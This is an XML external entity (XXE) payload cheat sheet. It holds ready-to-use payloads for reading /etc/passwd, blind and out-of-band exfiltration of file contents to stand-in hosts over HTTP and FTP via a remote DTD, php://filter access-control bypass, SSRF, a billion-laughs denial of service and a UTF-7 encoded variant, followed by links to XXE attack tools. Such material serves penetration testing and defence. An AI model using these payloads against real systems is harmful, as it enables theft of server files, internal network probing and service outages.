**LFI Test**

```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

**Blind LFI test (when first case doesn't return anything)**

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```

**Access Control bypass (loading restricted resources - PHP example)**

```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

**SSRF Test**

```
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

**XEE (XML Entity Expansion - DOS)**

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**XEE #2 (Remote attack - through external xml inclusion)**

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz><lol>3..2..1...&test<lol></lolz>
```

**XXE FTP HTTP Server**

https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb

http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
```
<!DOCTYPE data [
<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">
%remote;
%send;
]>
<data>4</data>

File stored on http://publicServer.com/parameterEntity_sendftp.dtd

<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
%param1;
```

**XXE UTF-7**

```
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
To convert between UTF-8 & UTF-7 use recode.
`recode UTF8..UTF7 payload-file.xml`

**Resources**
- [OWASP XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
- [Out of Band XML External Entity Injection via SAML SSO (Sam Melia)](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)

**Tools**
- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe/)
- [XXEinjector](https://github.com/enjoiz/XXEinjector)
- [xxer (xxe callback handler)](https://github.com/TheTwitchy/xxer)